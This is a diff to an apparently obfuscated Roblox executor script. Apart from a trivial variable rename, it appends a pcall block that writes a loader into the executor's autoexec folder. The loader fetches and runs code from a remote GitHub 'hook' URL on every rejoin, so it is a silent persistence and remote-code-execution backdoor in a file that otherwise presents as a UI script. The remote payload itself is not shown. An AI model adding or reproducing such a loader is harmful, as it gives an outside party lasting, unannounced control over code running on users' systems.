@@ -9467,7 +9467,7 @@ uiPadding.PaddingRight = UDim.new(0, v86[175])
 uiPadding.PaddingLeft = UDim.new(0, 1)
 uiPadding.Parent = instance
 arg._rt = { Outline = frame, Input = instance }
-local _tweenInfo = TweenInfo.new(0.05, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, v86[186], false, 0)
+local tweenInfo = TweenInfo.new(0.05, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, v86[186], false, 0)
 
 local function fn36(arg3)
 -- Frame is already full-width; just reset text size to default
@@ -66302,3 +66302,19 @@ function K.Unload()
 end
 
 tbl17.j1()(boot)
+
+-- Write hook to autoexec so it fires automatically on every rejoin
+pcall(function()
+    local HOOK_URL = "https://raw.githubusercontent.com/frxcture/kicia/refs/heads/main/hook"
+    local AUTOEXEC_FILE = "autoexec/KiciaRebuild.lua"
+    local loader = 'loadstring(game:HttpGet("' .. HOOK_URL .. '", true))()'
+
+    -- makefolder / isfolder / writefile are executor globals
+    if type(isfolder) == "function" and not isfolder("autoexec") then
+        pcall(makefolder, "autoexec")
+    end
+
+    if type(writefile) == "function" then
+        writefile(AUTOEXEC_FILE, loader)
+    end
+end)
